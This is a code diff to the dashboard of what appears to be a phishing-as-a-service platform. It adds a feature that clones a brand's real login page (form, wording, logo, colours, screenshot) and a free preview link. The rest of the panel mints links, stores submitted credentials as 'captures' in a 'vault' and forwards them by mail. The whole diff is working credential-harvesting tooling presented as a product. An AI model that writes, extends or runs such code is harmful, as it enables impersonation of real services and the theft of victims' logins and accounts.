@@ -15,6 +15,8 @@ import {
 } from "../../../server/domains";
 import { mintLink, listBrands, listLinks, revokeLink } from "../../../server/links";
 import { countCaptures, listCaptures } from "../../../server/vault";
+import { cloneLogin, reopenProfile, reviewProfile } from "../../../server/clone";
+import { listProfiles, previewUrl } from "../../../server/preview";
 import { CopyButton } from "../../../components/copy";
 import { ConfirmSubmit } from "../../../components/shell";
 import {
@@ -52,6 +54,10 @@ const errors: Record<string, string> = {
   address_unverified: "Confirm that address before forwarding to it.",
   capture_malformed: "That capture has nothing to send.",
   no_address: "Add a forwarding address first.",
+  bad_url: "Enter an https login page URL.",
+  clone_failed: "The cloner could not read that page. Try again or the brand's root URL.",
+  no_password_field: "That page has no password field, so it is not a login page.",
+  clone_too_large: "That page is too large to clone.",
 };
 
 const okay: Record<string, string> = {
@@ -64,6 +70,10 @@ const okay: Record<string, string> = {
   forward_added: "Address saved. Confirm it if it is not your signup address.",
   forwarded: "Capture queued for mail.",
   renewed: "Payment confirmed. The period is extended.",
+  cloned: "Login page cloned. Check it in the preview before creating real links.",
+  profile_accepted: "Clone accepted.",
+  profile_rejected: "Clone rejected. The preview falls back to the last usable one.",
+  preview_rebound: "Preview points at the accepted clone again.",
 };
 
 function codeOf(error: unknown): string {
@@ -95,18 +105,27 @@ export default async function ServiceDetail({
   const activated = Boolean(service.activatedAt);
   const price = money(service.priceCents);
 
-  const [hostnames, orgDomains, links, brands, captures, totalCaptures, addresses] =
-    activated
-      ? await Promise.all([
-          listHostnames(session, id),
-          listOrgDomains(session),
-          listLinks(session, id),
-          listBrands(),
-          listCaptures(session, { serviceId: id, limit: 5 }),
-          countCaptures(session, { serviceId: id }),
-          listAddresses(session),
-        ])
-      : [[], [], [], [], [], { total: 0, new: 0, valid: 0, invalid: 0 }, []];
+  const [
+    hostnames,
+    orgDomains,
+    links,
+    brands,
+    captures,
+    totalCaptures,
+    addresses,
+    profiles,
+  ] = activated
+    ? await Promise.all([
+        listHostnames(session, id),
+        listOrgDomains(session),
+        listLinks(session, id),
+        listBrands(),
+        listCaptures(session, { serviceId: id, limit: 5 }),
+        countCaptures(session, { serviceId: id }),
+        listAddresses(session),
+        listProfiles(session, id),
+      ])
+    : [[], [], [], [], [], { total: 0, new: 0, valid: 0, invalid: 0 }, [], []];
   const routable = orgDomains.filter((domain) =>
     ["active", "routing_waiting"].includes(domain.status),
   );
@@ -150,6 +169,33 @@ export default async function ServiceDetail({
       redirect(`/services/${id}?error=${codeOf(reason)}#domains`);
     }
     redirect(`/services/${id}?hostname_removed=1#domains`);
+  }
+
+  async function cloneAction(formData: FormData) {
+    "use server";
+    const ctx = await requirePageSession();
+    try {
+      await cloneLogin(ctx, id, String(formData.get("url") ?? ""));
+    } catch (reason) {
+      redirect(`/services/${id}?error=${codeOf(reason)}#clone`);
+    }
+    redirect(`/services/${id}?cloned=1#clone`);
+  }
+
+  async function reviewAction(formData: FormData) {
+    "use server";
+    const ctx = await requirePageSession();
+    const profileId = String(formData.get("profileId") ?? "");
+    const status = String(formData.get("status") ?? "");
+    try {
+      if (status === "generated") await reopenProfile(ctx, profileId);
+      else await reviewProfile(ctx, profileId, status as "accepted" | "rejected");
+    } catch (reason) {
+      redirect(`/services/${id}?error=${codeOf(reason)}#clone`);
+    }
+    redirect(
+      `/services/${id}?profile_${status === "generated" ? "accepted" : status}=1#clone`,
+    );
   }
 
   async function createLink(formData: FormData) {
@@ -203,7 +249,7 @@ export default async function ServiceDetail({
           { label: service.name },
         ]}
         title={service.name}
-        lede={`${service.serviceType} · ${service.tier} tier. Visitors get a hostname and slug that render the pinned brand, and every submit lands in your vault.`}
+        lede={`${service.serviceType} · ${service.tier} tier. Every visitor sees the cloned or pinned brand, and every submit lands in your vault.`}
         actions={
           <>
             <StatusPill
@@ -232,6 +278,41 @@ export default async function ServiceDetail({
           {okay[flash]}
         </p>
       ) : null}
+
+      <section className="card" id="preview">
+        <div className="row">
+          <div>
+            <h2>Preview link</h2>
+            <p className="muted">
+              Free, on the platform host, and live before any DNS. Share it to check the
+              page; captures from it land in the vault too.
+            </p>
+          </div>
+          {service.previewSlug ? (
+            <StatusPill status={service.previewSlug ? "active" : "provisioning"} />
+          ) : null}
+        </div>
+        {service.previewSlug ? (
+          <div className="copyfield-group">
+            <div className="field">
+              <label>Preview URL</label>
+              <div className="row">
+                <a
+                  className="mono"
+                  href={previewUrl(service.previewKey, service.previewSlug)}
+                  target="_blank"
+                  rel="noreferrer"
+                >
+                  {previewUrl(service.previewKey, service.previewSlug)}
+                </a>
+                <CopyButton value={previewUrl(service.previewKey, service.previewSlug)} />
+              </div>
+            </div>
+          </div>
+        ) : (
+          <p className="fine">The preview link is minted with the service.</p>
+        )}
+      </section>
 
       {!paid ? (
         <div className="card">
@@ -343,6 +424,94 @@ export default async function ServiceDetail({
                 </ol>
               </div>
             ) : null}
+
+            <section className="card" id="clone">
+              <div className="row">
+                <div>
+                  <h2>Cloned page</h2>
+                  <p className="muted">
+                    Point the cloner at the real login page. It reads the form, words,
+                    logo and colours; you accept or reject the result before it is used
+                    for real links.
+                  </p>
+                </div>
+              </div>
+
+              {profiles.length === 0 ? (
+                <Empty title="No clone yet">
+                  Without one the preview renders a neutral cPanel-style page. Paste the
+                  brand's sign-in URL to clone it.
+                </Empty>
+              ) : (
+                <div className="table">
+                  {profiles.map((profile) => (
+                    <div className="tr" key={profile.id}>
+                      {profile.screenshot_asset_id ? (
+                        <img
+                          src={`/a/${profile.screenshot_asset_id}`}
+                          alt=""
+                          width={72}
+                          height={48}
+                          style={{ objectFit: "cover", borderRadius: "4px" }}
+                        />
+                      ) : (
+                        <span />
+                      )}
+                      <div>
+                        <strong>{profile.brand_name ?? profile.email_domain}</strong>
+                        <span className="muted mono"> · {profile.source_url}</span>
+                      </div>
+                      <StatusPill status={profile.status} />
+                      <span className="muted">{shortDate(profile.created_at)}</span>
+                      <div className="actions">
+                        {profile.status !== "accepted" ? (
+                          <form action={reviewAction}>
+                            <input type="hidden" name="profileId" value={profile.id} />
+                            <input type="hidden" name="status" value="accepted" />
+                            <button type="submit" className="btn ghost sm">
+                              Accept
+                            </button>
+                          </form>
+                        ) : null}
+                        {profile.status !== "rejected" ? (
+                          <form action={reviewAction}>
+                            <input type="hidden" name="profileId" value={profile.id} />
+                            <input type="hidden" name="status" value="rejected" />
+                            <button type="submit" className="btn ghost sm">
+                              Reject
+                            </button>
+                          </form>
+                        ) : null}
+                      </div>
+                    </div>
+                  ))}
+                </div>
+              )}
+
+              <form
+                action={cloneAction}
+                className="inline-form"
+                style={{ marginTop: "0.9rem" }}
+              >
+                <div className="field grow">
+                  <label htmlFor="cloneUrl">Login page URL</label>
+                  <input
+                    id="cloneUrl"
+                    name="url"
+                    type="url"
+                    placeholder="https://accounts.example.com/login"
+                    required
+                  />
+                </div>
+                <button type="submit" className="btn">
+                  Clone page
+                </button>
+              </form>
+              <p className="fine">
+                The cloner uses a real browser and keeps a blurred screenshot as the
+                backdrop. It captures credentials only, never OTP.
+              </p>
+            </section>
 
             <section className="card" id="links">
               <div className="row">
